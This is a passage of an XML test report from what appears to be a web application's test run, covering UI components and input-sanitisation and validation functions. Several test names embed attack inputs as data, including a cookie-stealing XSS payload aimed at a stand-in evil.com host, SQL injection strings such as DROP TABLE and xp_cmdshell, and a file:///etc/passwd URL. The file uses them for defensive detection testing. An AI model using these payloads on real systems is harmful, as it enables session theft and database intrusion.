    </testcase>
    <testcase classname="SkeletonText renders 1 line by default" name="SkeletonText renders 1 line by default" time="0.005">
    </testcase>
    <testcase classname="SkeletonText applies custom className" name="SkeletonText applies custom className" time="0.004">
    </testcase>
    <testcase classname="SkeletonCard renders skeleton card layout" name="SkeletonCard renders skeleton card layout" time="0.008">
    </testcase>
    <testcase classname="SkeletonCard applies custom className" name="SkeletonCard applies custom className" time="0.008">
    </testcase>
    <testcase classname="SkeletonTable renders with default 5 rows" name="SkeletonTable renders with default 5 rows" time="0.06">
    </testcase>
    <testcase classname="SkeletonTable renders specified number of rows" name="SkeletonTable renders specified number of rows" time="0.049">
    </testcase>
    <testcase classname="SkeletonTable renders table with thead" name="SkeletonTable renders table with thead" time="0.044">
    </testcase>
    <testcase classname="Progress renders progress bar" name="Progress renders progress bar" time="0.009">
    </testcase>
    <testcase classname="Progress applies value as transform style on indicator" name="Progress applies value as transform style on indicator" time="0.006">
    </testcase>
    <testcase classname="Progress handles zero value" name="Progress handles zero value" time="0.005">
    </testcase>
    <testcase classname="Progress handles undefined value gracefully" name="Progress handles undefined value gracefully" time="0.005">
    </testcase>
    <testcase classname="Progress handles 100% value" name="Progress handles 100% value" time="0.005">
    </testcase>
    <testcase classname="Alert renders with role=&quot;alert&quot;" name="Alert renders with role=&quot;alert&quot;" time="0.105">
    </testcase>
    <testcase classname="Alert renders with destructive variant" name="Alert renders with destructive variant" time="0.012">
    </testcase>
    <testcase classname="Alert renders with warning variant" name="Alert renders with warning variant" time="0.01">
    </testcase>
    <testcase classname="Alert renders with info variant" name="Alert renders with info variant" time="0.008">
    </testcase>
    <testcase classname="Alert renders with success variant" name="Alert renders with success variant" time="0.009">
    </testcase>
    <testcase classname="AlertTitle renders as h5" name="AlertTitle renders as h5" time="0.009">
    </testcase>
    <testcase classname="AlertDescription renders description text" name="AlertDescription renders description text" time="0.004">
    </testcase>
    <testcase classname="Avatar renders avatar container" name="Avatar renders avatar container" time="0.008">
    </testcase>
    <testcase classname="Avatar renders user initials in fallback" name="Avatar renders user initials in fallback" time="0.005">
    </testcase>
    <testcase classname="Avatar applies custom className to Avatar" name="Avatar applies custom className to Avatar" time="0.009">
    </testcase>
    <testcase classname="AvatarImage renders image with crossOrigin attribute" name="AvatarImage renders image with crossOrigin attribute" time="0.024">
    </testcase>
    <testcase classname="AvatarImage renders fallback when image is not provided" name="AvatarImage renders fallback when image is not provided" time="0.005">
    </testcase>
  </testsuite>
  <testsuite name="sanitizeString" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:49" time="2.49" tests="217">
    <testcase classname="sanitizeString removes HTML tags" name="sanitizeString removes HTML tags" time="0.002">
    </testcase>
    <testcase classname="sanitizeString removes javascript: protocol" name="sanitizeString removes javascript: protocol" time="0.001">
    </testcase>
    <testcase classname="sanitizeString removes event handlers" name="sanitizeString removes event handlers" time="0.001">
    </testcase>
    <testcase classname="sanitizeString removes data:text/html" name="sanitizeString removes data:text/html" time="0.001">
    </testcase>
    <testcase classname="sanitizeString returns empty string for non-string input" name="sanitizeString returns empty string for non-string input" time="0.001">
    </testcase>
    <testcase classname="sanitizeHTML allows whitelisted tags" name="sanitizeHTML allows whitelisted tags" time="0.001">
    </testcase>
    <testcase classname="sanitizeHTML removes non-whitelisted tags" name="sanitizeHTML removes non-whitelisted tags" time="0">
    </testcase>
    <testcase classname="sanitizeHTML preserves case of allowed tags" name="sanitizeHTML preserves case of allowed tags" time="0.001">
    </testcase>
    <testcase classname="sanitizeObject sanitizes all string values in an object" name="sanitizeObject sanitizes all string values in an object" time="0.001">
    </testcase>
    <testcase classname="sanitizeObject handles nested objects recursively" name="sanitizeObject handles nested objects recursively" time="0.001">
    </testcase>
    <testcase classname="sanitizeObject preserves null and numbers" name="sanitizeObject preserves null and numbers" time="0">
    </testcase>
    <testcase classname="validateEmail accepts valid emails" name="validateEmail accepts valid emails" time="0.002">
    </testcase>
    <testcase classname="validateEmail rejects invalid emails" name="validateEmail rejects invalid emails" time="0.001">
    </testcase>
    <testcase classname="validateEmail rejects emails with double dots" name="validateEmail rejects emails with double dots" time="0">
    </testcase>
    <testcase classname="validateEmail rejects emails longer than 254 chars" name="validateEmail rejects emails longer than 254 chars" time="0.001">
    </testcase>
    <testcase classname="validatePhone accepts valid phone numbers" name="validatePhone accepts valid phone numbers" time="0.001">
    </testcase>
    <testcase classname="validatePhone rejects phones with invalid characters" name="validatePhone rejects phones with invalid characters" time="0.001">
    </testcase>
    <testcase classname="validatePhone rejects phones that are too short" name="validatePhone rejects phones that are too short" time="0">
    </testcase>
    <testcase classname="validatePhone rejects phones that are too long" name="validatePhone rejects phones that are too long" time="0.001">
    </testcase>
    <testcase classname="validateURL accepts valid HTTP URLs" name="validateURL accepts valid HTTP URLs" time="0.003">
    </testcase>
    <testcase classname="validateURL rejects invalid protocols" name="validateURL rejects invalid protocols" time="0.002">
    </testcase>
    <testcase classname="validateURL rejects malformed URLs" name="validateURL rejects malformed URLs" time="0.001">
    </testcase>
    <testcase classname="containsSQLInjection detects SELECT statements" name="containsSQLInjection detects SELECT statements" time="0.001">
    </testcase>
    <testcase classname="containsSQLInjection detects UNION statements" name="containsSQLInjection detects UNION statements" time="0.001">
    </testcase>
    <testcase classname="containsSQLInjection detects DROP statements" name="containsSQLInjection detects DROP statements" time="0.001">
    </testcase>
    <testcase classname="containsSQLInjection detects OR-based injection" name="containsSQLInjection detects OR-based injection" time="0.001">
    </testcase>
    <testcase classname="containsSQLInjection allows normal text" name="containsSQLInjection allows normal text" time="0.001">
    </testcase>
    <testcase classname="containsXSS detects script tags" name="containsXSS detects script tags" time="0.002">
    </testcase>
    <testcase classname="containsXSS detects iframe tags" name="containsXSS detects iframe tags" time="0.001">
    </testcase>
    <testcase classname="containsXSS detects javascript: protocol" name="containsXSS detects javascript: protocol" time="0.001">
    </testcase>
    <testcase classname="containsXSS detects event handlers" name="containsXSS detects event handlers" time="0">
    </testcase>
    <testcase classname="containsXSS detects eval()" name="containsXSS detects eval()" time="0.001">
    </testcase>
    <testcase classname="containsXSS allows normal HTML" name="containsXSS allows normal HTML" time="0.001">
    </testcase>
    <testcase classname="validatePassword rejects passwords shorter than 8 chars" name="validatePassword rejects passwords shorter than 8 chars" time="0.001">
    </testcase>
    <testcase classname="validatePassword rejects passwords without uppercase" name="validatePassword rejects passwords without uppercase" time="0.002">
    </testcase>
    <testcase classname="validatePassword rejects passwords without lowercase" name="validatePassword rejects passwords without lowercase" time="0">
    </testcase>
    <testcase classname="validatePassword rejects passwords without numbers" name="validatePassword rejects passwords without numbers" time="0">
    </testcase>
    <testcase classname="validatePassword rejects passwords without special chars" name="validatePassword rejects passwords without special chars" time="0.001">
    </testcase>
    <testcase classname="validatePassword rejects common passwords" name="validatePassword rejects common passwords" time="0.001">
    </testcase>
    <testcase classname="validatePassword accepts strong passwords" name="validatePassword accepts strong passwords" time="0">
    </testcase>
    <testcase classname="maskSensitiveData masks all but last N characters" name="maskSensitiveData masks all but last N characters" time="0">
    </testcase>
    <testcase classname="maskSensitiveData returns *** for empty string" name="maskSensitiveData returns *** for empty string" time="0.001">
    </testcase>
    <testcase classname="maskSensitiveData handles string shorter than showLast" name="maskSensitiveData handles string shorter than showLast" time="0">
    </testcase>
    <testcase classname="maskSensitiveData shows full mask when showLast is 0" name="maskSensitiveData shows full mask when showLast is 0" time="0.001">
    </testcase>
    <testcase classname="containsSensitiveData detects credit card numbers" name="containsSensitiveData detects credit card numbers" time="0.001">
    </testcase>
    <testcase classname="containsSensitiveData detects SSN patterns" name="containsSensitiveData detects SSN patterns" time="0">
    </testcase>
    <testcase classname="containsSensitiveData detects email addresses" name="containsSensitiveData detects email addresses" time="0">
    </testcase>
    <testcase classname="containsSensitiveData allows normal text" name="containsSensitiveData allows normal text" time="0.002">
    </testcase>
    <testcase classname="generateSecurePassword generates password of correct length" name="generateSecurePassword generates password of correct length" time="0.003">
    </testcase>
    <testcase classname="generateSecurePassword contains at least one uppercase letter" name="generateSecurePassword contains at least one uppercase letter" time="0.001">
    </testcase>
    <testcase classname="generateSecurePassword contains at least one lowercase letter" name="generateSecurePassword contains at least one lowercase letter" time="0.001">
    </testcase>
    <testcase classname="generateSecurePassword contains at least one number" name="generateSecurePassword contains at least one number" time="0.001">
    </testcase>
    <testcase classname="generateSecurePassword contains at least one special character" name="generateSecurePassword contains at least one special character" time="0.001">
    </testcase>
    <testcase classname="generateAPIKey generates key with correct format" name="generateAPIKey generates key with correct format" time="0.001">
    </testcase>
    <testcase classname="validateAPIKeyFormat accepts valid API key format" name="validateAPIKeyFormat accepts valid API key format" time="0.001">
    </testcase>
    <testcase classname="validateAPIKeyFormat rejects invalid prefix" name="validateAPIKeyFormat rejects invalid prefix" time="0">
    </testcase>
    <testcase classname="validateAPIKeyFormat rejects wrong length" name="validateAPIKeyFormat rejects wrong length" time="0">
    </testcase>
    <testcase classname="validateAPIKeyFormat rejects non-hex characters" name="validateAPIKeyFormat rejects non-hex characters" time="0">
    </testcase>
    <testcase classname="hashAPIKey produces consistent hash for same input" name="hashAPIKey produces consistent hash for same input" time="0">
    </testcase>
    <testcase classname="hashAPIKey produces different hash for different input" name="hashAPIKey produces different hash for different input" time="0.001">
    </testcase>
    <testcase classname="validateFile rejects oversized files" name="validateFile rejects oversized files" time="1.192">
    </testcase>
    <testcase classname="validateFile rejects invalid mime types" name="validateFile rejects invalid mime types" time="0.001">
    </testcase>
    <testcase classname="validateFile rejects invalid extensions" name="validateFile rejects invalid extensions" time="0.002">
    </testcase>
    <testcase classname="validateFile accepts valid image files" name="validateFile accepts valid image files" time="0.001">
    </testcase>
    <testcase classname="logSecurityEvent logs security events without throwing" name="logSecurityEvent logs security events without throwing" time="0.003">
    </testcase>
    <testcase classname="sanitizeString - parameterized sanitizes dangerous input: &lt;script&gt;alert(1)&lt;/script&gt;" name="sanitizeString - parameterized sanitizes dangerous input: &lt;script&gt;alert(1)&lt;/script&gt;" time="0.001">
    </testcase>
    <testcase classname="sanitizeString - parameterized sanitizes dangerous input: &lt;img src=x onerror=alert(1)&gt;" name="sanitizeString - parameterized sanitizes dangerous input: &lt;img src=x onerror=alert(1)&gt;" time="0.001">
    </testcase>
    <testcase classname="sanitizeString - parameterized sanitizes dangerous input: &lt;p&gt;Hello&lt;/p&gt;" name="sanitizeString - parameterized sanitizes dangerous input: &lt;p&gt;Hello&lt;/p&gt;" time="0.001">
    </testcase>
    <testcase classname="sanitizeString - parameterized sanitizes dangerous input: &lt;div&gt;&lt;span&gt;text&lt;/span&gt;&lt;/div&gt;" name="sanitizeString - parameterized sanitizes dangerous input: &lt;div&gt;&lt;span&gt;text&lt;/span&gt;&lt;/div&gt;" time="0.001">
    </testcase>
    <testcase classname="sanitizeString - parameterized sanitizes dangerous input: &lt;a href=&quot;javascript:alert(1)&quot;&gt;click&lt;/a&gt;" name="sanitizeString - parameterized sanitizes dangerous input: &lt;a href=&quot;javascript:alert(1)&quot;&gt;click&lt;/a&gt;" time="0.001">
    </testcase>
    <testcase classname="sanitizeString - parameterized sanitizes dangerous input: &lt;b&gt;bold&lt;/b&gt; &lt;i&gt;italic&lt;/i&gt;" name="sanitizeString - parameterized sanitizes dangerous input: &lt;b&gt;bold&lt;/b&gt; &lt;i&gt;italic&lt;/i&gt;" time="0">
    </testcase>
    <testcase classname="sanitizeString - parameterized sanitizes dangerous input: &lt;script&gt;evil()&lt;/script&gt;&lt;p&gt;good&lt;/p&gt;" name="sanitizeString - parameterized sanitizes dangerous input: &lt;script&gt;evil()&lt;/script&gt;&lt;p&gt;good&lt;/p&gt;" time="0.001">
    </testcase>
    <testcase classname="sanitizeString - parameterized sanitizes dangerous input:   spaced  " name="sanitizeString - parameterized sanitizes dangerous input:   spaced  " time="0.001">
    </testcase>
    <testcase classname="sanitizeString - parameterized sanitizes dangerous input: javascript:void(0)" name="sanitizeString - parameterized sanitizes dangerous input: javascript:void(0)" time="0.001">
    </testcase>
    <testcase classname="sanitizeString - parameterized sanitizes dangerous input: onclick=doEvil()" name="sanitizeString - parameterized sanitizes dangerous input: onclick=doEvil()" time="0.001">
    </testcase>
    <testcase classname="sanitizeString - parameterized sanitizes dangerous input: data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;" name="sanitizeString - parameterized sanitizes dangerous input: data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;" time="0.001">
    </testcase>
    <testcase classname="sanitizeString - parameterized sanitizes dangerous input: plain text" name="sanitizeString - parameterized sanitizes dangerous input: plain text" time="0.002">
    </testcase>
    <testcase classname="sanitizeString - parameterized sanitizes dangerous input: " name="sanitizeString - parameterized sanitizes dangerous input: " time="0.001">
    </testcase>
    <testcase classname="sanitizeString - parameterized sanitizes dangerous input:    " name="sanitizeString - parameterized sanitizes dangerous input:    " time="0.001">
    </testcase>
    <testcase classname="sanitizeString - parameterized sanitizes dangerous input: &lt;script/&gt;&lt;p&gt;test&lt;/p&gt;" name="sanitizeString - parameterized sanitizes dangerous input: &lt;script/&gt;&lt;p&gt;test&lt;/p&gt;" time="0.002">
    </testcase>
    <testcase classname="validateEmail - parameterized accepts valid email: user@example.com" name="validateEmail - parameterized accepts valid email: user@example.com" time="0.001">
    </testcase>
    <testcase classname="validateEmail - parameterized accepts valid email: test.user@domain.co" name="validateEmail - parameterized accepts valid email: test.user@domain.co" time="0">
    </testcase>
    <testcase classname="validateEmail - parameterized accepts valid email: user+tag@example.org" name="validateEmail - parameterized accepts valid email: user+tag@example.org" time="0.001">
    </testcase>
    <testcase classname="validateEmail - parameterized accepts valid email: user-name@example.com" name="validateEmail - parameterized accepts valid email: user-name@example.com" time="0">
    </testcase>
    <testcase classname="validateEmail - parameterized accepts valid email: user_name@example.com" name="validateEmail - parameterized accepts valid email: user_name@example.com" time="0.001">
    </testcase>
    <testcase classname="validateEmail - parameterized accepts valid email: a@b.cc" name="validateEmail - parameterized accepts valid email: a@b.cc" time="0">
    </testcase>
    <testcase classname="validateEmail - parameterized accepts valid email: 123@example.com" name="validateEmail - parameterized accepts valid email: 123@example.com" time="0.001">
    </testcase>
    <testcase classname="validateEmail - parameterized accepts valid email: üser@example.com" name="validateEmail - parameterized accepts valid email: üser@example.com" time="0">
    </testcase>
    <testcase classname="validateEmail - parameterized rejects invalid email: invalid" name="validateEmail - parameterized rejects invalid email: invalid" time="0.004">
    </testcase>
    <testcase classname="validateEmail - parameterized rejects invalid email: @domain.com" name="validateEmail - parameterized rejects invalid email: @domain.com" time="0.001">
    </testcase>
    <testcase classname="validateEmail - parameterized rejects invalid email: user@" name="validateEmail - parameterized rejects invalid email: user@" time="0.007">
    </testcase>
    <testcase classname="validateEmail - parameterized rejects invalid email: user@domain" name="validateEmail - parameterized rejects invalid email: user@domain" time="0">
    </testcase>
    <testcase classname="validateEmail - parameterized rejects invalid email: user..name@example.com" name="validateEmail - parameterized rejects invalid email: user..name@example.com" time="0">
    </testcase>
    <testcase classname="validateEmail - parameterized rejects invalid email: user@domain..com" name="validateEmail - parameterized rejects invalid email: user@domain..com" time="0.001">
    </testcase>
    <testcase classname="validateEmail - parameterized rejects invalid email: user@example." name="validateEmail - parameterized rejects invalid email: user@example." time="0">
    </testcase>
    <testcase classname="validateEmail - parameterized rejects invalid email: " name="validateEmail - parameterized rejects invalid email: " time="0.001">
    </testcase>
    <testcase classname="validatePhone - parameterized accepts valid phone: +1234567890" name="validatePhone - parameterized accepts valid phone: +1234567890" time="0.001">
    </testcase>
    <testcase classname="validatePhone - parameterized accepts valid phone: 1234567890" name="validatePhone - parameterized accepts valid phone: 1234567890" time="0">
    </testcase>
    <testcase classname="validatePhone - parameterized accepts valid phone: +37410123456" name="validatePhone - parameterized accepts valid phone: +37410123456" time="0.001">
    </testcase>
    <testcase classname="validatePhone - parameterized accepts valid phone: +1 (234) 567-8901" name="validatePhone - parameterized accepts valid phone: +1 (234) 567-8901" time="0">
    </testcase>
    <testcase classname="validatePhone - parameterized accepts valid phone: 99876543210" name="validatePhone - parameterized accepts valid phone: 99876543210" time="0.001">
    </testcase>
    <testcase classname="validatePhone - parameterized rejects invalid phone: 123456789" name="validatePhone - parameterized rejects invalid phone: 123456789" time="0">
    </testcase>
    <testcase classname="validatePhone - parameterized rejects invalid phone: 1234567890123456" name="validatePhone - parameterized rejects invalid phone: 1234567890123456" time="0">
    </testcase>
    <testcase classname="validatePhone - parameterized rejects invalid phone: abc1234567" name="validatePhone - parameterized rejects invalid phone: abc1234567" time="0.001">
    </testcase>
    <testcase classname="validatePhone - parameterized rejects invalid phone: " name="validatePhone - parameterized rejects invalid phone: " time="0">
    </testcase>
    <testcase classname="validateURL - parameterized accepts valid URL: http://example.com" name="validateURL - parameterized accepts valid URL: http://example.com" time="0.003">
    </testcase>
    <testcase classname="validateURL - parameterized accepts valid URL: https://example.com" name="validateURL - parameterized accepts valid URL: https://example.com" time="0.001">
    </testcase>
    <testcase classname="validateURL - parameterized accepts valid URL: https://example.com/path?query=1" name="validateURL - parameterized accepts valid URL: https://example.com/path?query=1" time="0.001">
    </testcase>
    <testcase classname="validateURL - parameterized accepts valid URL: http://localhost:3000" name="validateURL - parameterized accepts valid URL: http://localhost:3000" time="0.001">
    </testcase>
    <testcase classname="validateURL - parameterized accepts valid URL: https://sub.domain.com:8080/path#hash" name="validateURL - parameterized accepts valid URL: https://sub.domain.com:8080/path#hash" time="0.001">
    </testcase>
    <testcase classname="validateURL - parameterized accepts valid URL: https://very.long.domain.name.com/deep/path/here" name="validateURL - parameterized accepts valid URL: https://very.long.domain.name.com/deep/path/here" time="0.001">
    </testcase>
    <testcase classname="validateURL - parameterized rejects invalid URL: ftp://example.com" name="validateURL - parameterized rejects invalid URL: ftp://example.com" time="0.001">
    </testcase>
    <testcase classname="validateURL - parameterized rejects invalid URL: javascript:alert(1)" name="validateURL - parameterized rejects invalid URL: javascript:alert(1)" time="0.001">
    </testcase>
    <testcase classname="validateURL - parameterized rejects invalid URL: not-a-url" name="validateURL - parameterized rejects invalid URL: not-a-url" time="0.001">
    </testcase>
    <testcase classname="validateURL - parameterized rejects invalid URL: " name="validateURL - parameterized rejects invalid URL: " time="0">
    </testcase>
    <testcase classname="validateURL - parameterized rejects invalid URL: http://" name="validateURL - parameterized rejects invalid URL: http://" time="0.001">
    </testcase>
    <testcase classname="validateURL - parameterized rejects invalid URL: file:///etc/passwd" name="validateURL - parameterized rejects invalid URL: file:///etc/passwd" time="0.002">
    </testcase>
    <testcase classname="validateURL - parameterized rejects invalid URL: data:text/html,hello" name="validateURL - parameterized rejects invalid URL: data:text/html,hello" time="0.001">
    </testcase>
    <testcase classname="containsSQLInjection - parameterized detects SQL injection: &apos;; SELECT * FROM users --" name="containsSQLInjection - parameterized detects SQL injection: &apos;; SELECT * FROM users --" time="0.001">
    </testcase>
    <testcase classname="containsSQLInjection - parameterized detects SQL injection: 1 UNION SELECT 1,2,3" name="containsSQLInjection - parameterized detects SQL injection: 1 UNION SELECT 1,2,3" time="0">
    </testcase>
    <testcase classname="containsSQLInjection - parameterized detects SQL injection: &apos;; DROP TABLE users; --" name="containsSQLInjection - parameterized detects SQL injection: &apos;; DROP TABLE users; --" time="0.001">
    </testcase>
    <testcase classname="containsSQLInjection - parameterized detects SQL injection: &apos; OR &apos;1&apos;=&apos;1" name="containsSQLInjection - parameterized detects SQL injection: &apos; OR &apos;1&apos;=&apos;1" time="0">
    </testcase>
    <testcase classname="containsSQLInjection - parameterized detects SQL injection: admin&apos;--" name="containsSQLInjection - parameterized detects SQL injection: admin&apos;--" time="0.001">
    </testcase>
    <testcase classname="containsSQLInjection - parameterized detects SQL injection: &apos; OR 1=1--" name="containsSQLInjection - parameterized detects SQL injection: &apos; OR 1=1--" time="0">
    </testcase>
    <testcase classname="containsSQLInjection - parameterized detects SQL injection: &apos;; EXEC xp_cmdshell" name="containsSQLInjection - parameterized detects SQL injection: &apos;; EXEC xp_cmdshell" time="0.001">
    </testcase>
    <testcase classname="containsSQLInjection - parameterized detects SQL injection: &apos; UNION SELECT * FROM passwords" name="containsSQLInjection - parameterized detects SQL injection: &apos; UNION SELECT * FROM passwords" time="0">
    </testcase>
    <testcase classname="containsSQLInjection - parameterized detects SQL injection: &apos;; DELETE FROM logs;--" name="containsSQLInjection - parameterized detects SQL injection: &apos;; DELETE FROM logs;--" time="0.001">
    </testcase>
    <testcase classname="containsSQLInjection - parameterized detects SQL injection: SELECT password FROM admins" name="containsSQLInjection - parameterized detects SQL injection: SELECT password FROM admins" time="0.001">
    </testcase>
    <testcase classname="containsSQLInjection - parameterized detects SQL injection: &apos;; INSERT INTO users VALUES ...--" name="containsSQLInjection - parameterized detects SQL injection: &apos;; INSERT INTO users VALUES ...--" time="0">
    </testcase>
    <testcase classname="containsSQLInjection - parameterized allows safe text: Hello world" name="containsSQLInjection - parameterized allows safe text: Hello world" time="0.001">
    </testcase>
    <testcase classname="containsSQLInjection - parameterized allows safe text: normal text" name="containsSQLInjection - parameterized allows safe text: normal text" time="0.001">
    </testcase>
    <testcase classname="containsSQLInjection - parameterized allows safe text: user input" name="containsSQLInjection - parameterized allows safe text: user input" time="0">
    </testcase>
    <testcase classname="containsXSS - parameterized detects XSS: &lt;script&gt;alert(1)&lt;/script&gt;" name="containsXSS - parameterized detects XSS: &lt;script&gt;alert(1)&lt;/script&gt;" time="0.001">
    </testcase>
    <testcase classname="containsXSS - parameterized detects XSS: &lt;iframe src=&quot;evil.com&quot;&gt;&lt;/iframe&gt;" name="containsXSS - parameterized detects XSS: &lt;iframe src=&quot;evil.com&quot;&gt;&lt;/iframe&gt;" time="0">
    </testcase>
    <testcase classname="containsXSS - parameterized detects XSS: javascript:alert(1)" name="containsXSS - parameterized detects XSS: javascript:alert(1)" time="0.001">
    </testcase>
    <testcase classname="containsXSS - parameterized detects XSS: &lt;img onerror=&quot;alert(1)&quot;&gt;" name="containsXSS - parameterized detects XSS: &lt;img onerror=&quot;alert(1)&quot;&gt;" time="0">
    </testcase>
    <testcase classname="containsXSS - parameterized detects XSS: eval(&quot;malicious&quot;)" name="containsXSS - parameterized detects XSS: eval(&quot;malicious&quot;)" time="0">
    </testcase>
    <testcase classname="containsXSS - parameterized detects XSS: &lt;embed src=&quot;evil.swf&quot;&gt;" name="containsXSS - parameterized detects XSS: &lt;embed src=&quot;evil.swf&quot;&gt;" time="0.002">
    </testcase>
    <testcase classname="containsXSS - parameterized detects XSS: &lt;object data=&quot;evil.swf&quot;&gt;&lt;/object&gt;" name="containsXSS - parameterized detects XSS: &lt;object data=&quot;evil.swf&quot;&gt;&lt;/object&gt;" time="0.001">
    </testcase>
    <testcase classname="containsXSS - parameterized detects XSS: &lt;script src=&quot;http://evil.com/xss.js&quot;&gt;&lt;/script&gt;" name="containsXSS - parameterized detects XSS: &lt;script src=&quot;http://evil.com/xss.js&quot;&gt;&lt;/script&gt;" time="0">
    </testcase>
    <testcase classname="containsXSS - parameterized detects XSS: &lt;img src=x onerror=this.src=&quot;http://evil.com/steal?cookie=&quot;+document.cookie&gt;" name="containsXSS - parameterized detects XSS: &lt;img src=x onerror=this.src=&quot;http://evil.com/steal?cookie=&quot;+document.cookie&gt;" time="0">
    </testcase>
    <testcase classname="containsXSS - parameterized detects XSS: &lt;svg onload=alert(1)&gt;" name="containsXSS - parameterized detects XSS: &lt;svg onload=alert(1)&gt;" time="0">
    </testcase>
    <testcase classname="containsSensitiveData - parameterized detects sensitive data: Card: 4111111111111111 -&gt; true" name="containsSensitiveData - parameterized detects sensitive data: Card: 4111111111111111 -&gt; true" time="0">
    </testcase>
    <testcase classname="containsSensitiveData - parameterized detects sensitive data: SSN: 123-45-6789 -&gt; true" name="containsSensitiveData - parameterized detects sensitive data: SSN: 123-45-6789 -&gt; true" time="0.001">
    </testcase>
    <testcase classname="containsSensitiveData - parameterized detects sensitive data: Contact: user@example.com -&gt; true" name="containsSensitiveData - parameterized detects sensitive data: Contact: user@example.com -&gt; true" time="0">
    </testcase>
    <testcase classname="containsSensitiveData - parameterized detects sensitive data: Email me at test@test.com -&gt; true" name="containsSensitiveData - parameterized detects sensitive data: Email me at test@test.com -&gt; true" time="0">
    </testcase>
    <testcase classname="containsSensitiveData - parameterized detects sensitive data: Call me at 555-123-4567 -&gt; true" name="containsSensitiveData - parameterized detects sensitive data: Call me at 555-123-4567 -&gt; true" time="0.001">
    </testcase>
    <testcase classname="containsSensitiveData - parameterized detects sensitive data: Hello world -&gt; false" name="containsSensitiveData - parameterized detects sensitive data: Hello world -&gt; false" time="0.001">
    </testcase>
    <testcase classname="containsSensitiveData - parameterized detects sensitive data: just some normal text -&gt; false" name="containsSensitiveData - parameterized detects sensitive data: just some normal text -&gt; false" time="0">
    </testcase>
    <testcase classname="containsSensitiveData - parameterized detects sensitive data: nothing sensitive here -&gt; false" name="containsSensitiveData - parameterized detects sensitive data: nothing sensitive here -&gt; false" time="0.001">
    </testcase>
    <testcase classname="maskSensitiveData - parameterized masks 1234567890 (showLast=4) -&gt; ******7890" name="maskSensitiveData - parameterized masks 1234567890 (showLast=4) -&gt; ******7890" time="0">
    </testcase>
    <testcase classname="maskSensitiveData - parameterized masks abcdef (showLast=2) -&gt; ****ef" name="maskSensitiveData - parameterized masks abcdef (showLast=2) -&gt; ****ef" time="0.001">
    </testcase>
    <testcase classname="maskSensitiveData - parameterized masks abc (showLast=5) -&gt; abc" name="maskSensitiveData - parameterized masks abc (showLast=5) -&gt; abc" time="0">
    </testcase>
    <testcase classname="maskSensitiveData - parameterized masks  (showLast=4) -&gt; ***" name="maskSensitiveData - parameterized masks  (showLast=4) -&gt; ***" time="0.001">
    </testcase>
    <testcase classname="maskSensitiveData - parameterized masks secret (showLast=0) -&gt; ******secret" name="maskSensitiveData - parameterized masks secret (showLast=0) -&gt; ******secret" time="0">
    </testcase>
    <testcase classname="maskSensitiveData - parameterized masks a (showLast=1) -&gt; a" name="maskSensitiveData - parameterized masks a (showLast=1) -&gt; a" time="0.001">
    </testcase>
    <testcase classname="maskSensitiveData - parameterized masks ab (showLast=2) -&gt; ab" name="maskSensitiveData - parameterized masks ab (showLast=2) -&gt; ab" time="0">
    </testcase>
    <testcase classname="maskSensitiveData - parameterized masks abc (showLast=3) -&gt; abc" name="maskSensitiveData - parameterized masks abc (showLast=3) -&gt; abc" time="0.001">
    </testcase>
    <testcase classname="maskSensitiveData - parameterized masks 1234 (showLast=2) -&gt; **34" name="maskSensitiveData - parameterized masks 1234 (showLast=2) -&gt; **34" time="0">
    </testcase>
    <testcase classname="maskSensitiveData - parameterized masks hello world (showLast=5) -&gt; ******world" name="maskSensitiveData - parameterized masks hello world (showLast=5) -&gt; ******world" time="0.001">
    </testcase>
    <testcase classname="validatePassword - parameterized rejects weak password: " name="validatePassword - parameterized rejects weak password: " time="0.025">
    </testcase>
    <testcase classname="validatePassword - parameterized rejects weak password: Ab1!" name="validatePassword - parameterized rejects weak password: Ab1!" time="0.003">
    </testcase>
    <testcase classname="validatePassword - parameterized rejects weak password: password" name="validatePassword - parameterized rejects weak password: password" time="0">
    </testcase>
    <testcase classname="validatePassword - parameterized rejects weak password: 12345678" name="validatePassword - parameterized rejects weak password: 12345678" time="0">
    </testcase>
    <testcase classname="validatePassword - parameterized rejects weak password: qwerty" name="validatePassword - parameterized rejects weak password: qwerty" time="0.001">
    </testcase>
    <testcase classname="validatePassword - parameterized rejects weak password: abcdefgh" name="validatePassword - parameterized rejects weak password: abcdefgh" time="0.001">
    </testcase>
    <testcase classname="validatePassword - parameterized rejects weak password: Password1" name="validatePassword - parameterized rejects weak password: Password1" time="0.001">
    </testcase>
    <testcase classname="validatePassword - parameterized accepts strong password: MyStr0ng!P@ss" name="validatePassword - parameterized accepts strong password: MyStr0ng!P@ss" time="0.001">
    </testcase>
    <testcase classname="validatePassword - parameterized accepts strong password: C0mpl3x!ty" name="validatePassword - parameterized accepts strong password: C0mpl3x!ty" time="0">
    </testcase>
    <testcase classname="validatePassword - parameterized accepts strong password: S3cur3!Pass" name="validatePassword - parameterized accepts strong password: S3cur3!Pass" time="0">
    </testcase>
    <testcase classname="validatePassword - parameterized accepts strong password: Str0ng!P@$word" name="validatePassword - parameterized accepts strong password: Str0ng!P@$word" time="0">
    </testcase>
    <testcase classname="validatePassword - parameterized accepts strong password: V3ryStr0ng!" name="validatePassword - parameterized accepts strong password: V3ryStr0ng!" time="0">
    </testcase>
    <testcase classname="validateEmail - edge cases rejects edge case: no-at-sign" name="validateEmail - edge cases rejects edge case: no-at-sign" time="0.001">
    </testcase>
    <testcase classname="validateEmail - edge cases rejects edge case: @missing-local" name="validateEmail - edge cases rejects edge case: @missing-local" time="0">
    </testcase>
    <testcase classname="validateEmail - edge cases rejects edge case: missing-domain@" name="validateEmail - edge cases rejects edge case: missing-domain@" time="0.001">
    </testcase>
    <testcase classname="validateEmail - edge cases rejects edge case: double..dot@example.com" name="validateEmail - edge cases rejects edge case: double..dot@example.com" time="0.001">
    </testcase>
    <testcase classname="validateEmail - edge cases rejects edge case: trailing-dot@example." name="validateEmail - edge cases rejects edge case: trailing-dot@example." time="0.001">
    </testcase>
